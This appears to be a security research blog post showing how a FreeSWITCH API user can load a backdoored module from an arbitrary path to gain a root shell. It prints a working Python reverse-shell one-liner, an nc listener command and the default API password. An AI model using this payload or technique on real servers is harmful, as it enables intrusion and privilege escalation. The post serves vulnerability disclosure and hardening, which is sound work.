---
author: Julio
date: 2026-04-11
title: "Loading Modules From Untrusted Paths to Achieve RCE/Privilege Escalation in FreeSwitch"
image: /assets/images/freeswitch_rce_privesc1.svg
---

<p style="text-align: center"><img src="/assets/images/freeswitch_rce_privesc1.svg" alt="Diagram showing FreeSwitch's exploitation path" width="650"></p>

# Loading Modules From Untrusted Paths to Achieve RCE/Privilege Escalation in FreeSwitch

Not long ago, we were creating an integration with FreeSWITCH to allow our customers to use Rocket.Chat as a client. As part of the development process, the security team performed an assessment of FreeSWITCH, looking for possible misconfigurations and how to harden it.

One of the risks that we listed was the possibility of an attacker logging into FreeSWITCH’s ESL/API (port 8021) and issuing system commands with `system` or `bg_system` from the `mod_dptools` module. By reviewing FreeSWITCH’s code, we noticed that it was possible to disable system commands by adding the following values to `vars.xml`:

```xml
<X-PRE-PROCESS cmd="set" data="disable_system_api_commands=true"/>
<X-PRE-PROCESS cmd="set" data="disable_system_app_commands=true"/>
```

We were then thinking about other attack paths that could be leveraged by an attacker with access to the API to execute system commands or run arbitrary code. We investigated how modules are loaded and unloaded and how one can create a new module and add it to FreeSWITCH. We found documentation on how to create new modules and saw that it’s recommended that the module be created under `freeswitch/src/mod/applications`.

Once FreeSWITCH is built, it appears that all the modules are stored as shared libraries in the same directory:

![FreeSWITCH modules directory](/assets/images/freeswitch_1.png)

When we try loading a module that doesn’t exist, we get the following error:

![Module not found error](/assets/images/freeswitch_2.png)

Looking at the code, we found the following function:

```c
if (switch_is_file_path(file)) {
		path = switch_core_strdup(loadable_modules.pool, file);
		file = (char *) switch_cut_path(file);
		if ((dot = strchr(file, '.'))) {
			*dot = '\0';
		}
	} else {
		if ((dot = strchr(file, '.'))) {
			*dot = '\0';
		}
		len = strlen(switch_str_nil(dir));
		len += strlen(file);
		len += 8;
		path = (char *) switch_core_alloc(loadable_modules.pool, len);
		switch_snprintf(path, len, "%s%s%s%s", switch_str_nil(dir), SWITCH_PATH_SEPARATOR, file, ext);
	}
```

And the following one:

```c
static inline switch_bool_t switch_is_file_path(const char *file)
{
	const char *e;
	int r;

	if (zstr(file)) {
		return SWITCH_FALSE;
	}

	while(*file == '{') {
		if ((e = switch_find_end_paren(file, '{', '}'))) {
			file = e + 1;
			while(*file == ' ') file++;
		}
	}

#ifdef WIN32
	r = (*file == '\\' || *(file + 1) == ':' || *file == '/' || strstr(file, SWITCH_URL_SEPARATOR));
#else
	r = ((*file == '/') || strstr(file, SWITCH_URL_SEPARATOR));
#endif

	return r ? SWITCH_TRUE : SWITCH_FALSE;
}
```

So it seems like FreeSWITCH accepts both filenames and full paths.

As there seems to be no integrity checks on the default modules being loaded, nor is a specific path validated, a malicious user with access to the API (by either using the default `ClueCon` password, brute-forcing it, or finding it by looting credentials in other files) would be able to load a malicious or backdoored module.

As an example, we copied `mod_dptools.c` and altered it to execute a reverse shell as soon as the module loads:

![Backdoored mod_dptools code](/assets/images/freeswitch_3.png)

The decoded `base64` blob is a reverse shell payload:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

We then compiled this module as a `.so` file and saved it under `/tmp/mod_dptools.so`. We initiated a listener as a low-privileged user inside the server with `nc -nvlp 9002`.

We compiled FreeSWITCH with its original code and started a new server. After that, we logged into the API, unloaded the `mod_dptools` module and loaded our backdoored module from `/tmp/mod_dptools.so`.

![Loading backdoored module](/assets/images/freeswitch_4.png)

Once we loaded the backdoored module, we got a reverse shell connection as the root user:

![Reverse shell as root](/assets/images/freeswitch_5.png)

An attacker targeting a FreeSWITCH server on Linux would likely exploit a file upload feature in another service or already have access to the system as a low-privilege user, seeking a path to escalate privileges - particularly since FreeSWITCH installations are often observed running as `root`.

We communicated this finding to the FreeSWITCH security team a year ago. They indicated that this is intended behavior and that the ability to load modules from arbitrary paths seems to be by design. I still decided to post this because it was fun diving into FreeSWITCH's code and play with possible attack paths.
